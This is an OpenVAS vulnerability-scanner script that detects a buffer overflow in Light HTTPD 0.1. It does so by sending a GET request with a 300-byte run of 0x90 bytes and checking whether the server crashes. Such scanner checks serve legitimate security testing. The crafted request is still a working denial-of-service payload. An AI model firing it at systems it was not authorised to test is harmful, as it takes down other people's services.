###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_light_httpd_bof_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Light HTTPD Buffer Overflow Vulnerability
#
# Authors:
# Arun Kallavi <karun@secpod.com>
#
# Copyright:
# Copyright (c) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote unauthenticated attackers
  to cause a buffer overflow, resulting in a denial of service or potentially
  allowing the execution of arbitrary code.
  Impact Level: System/Application";

tag_affected = "Light HTTPD 0.1";
tag_insight = "The flaw exists due to improper handling of user-supplied input.";
tag_solution = "No solution or patch is available as of 26th April, 2013. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://lhttpd.sourceforge.net";
tag_summary = "The host is running Light HTTPD and is prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(903207);
  script_version("$Revision: 11 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-04-26 14:47:16 +0530 (Fri, 26 Apr 2013)");
  script_name("Light HTTPD Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_description(desc);
  script_xref(name : "URL" , value : "http://en.securitylab.ru/poc/439850.php");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/24999");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013040182");
  script_summary("Check if Light HTTPD is vulnerable to buffer overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2013 SecPod");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 3000);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

include("http_func.inc");

## Variable Initialization
banner = "";
crash = "";
port = 0;
req = "";
res = "";

## Get HTTP Port
port = get_http_port(default:3000);
if(!port){
  port = 3000;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Light HTTPd" >!< banner){
  exit(0);
}

if(http_is_dead(port:port))exit(0);

## Construct crafted request
crash = crap(data: "\x90", length: 300);
req = string("GET /", crash, " HTTP/1.0\r\n",
             "Host: ", get_host_name(), "\r\n\r\n");

## Send crafted request
for(i=0 ;i < 3; i++){
res = http_send_recv(port:port, data:req);
}

## Confirm Light HTTPD is dead
if(http_is_dead(port:port))
{
  security_hole(port);
  exit(0);
}
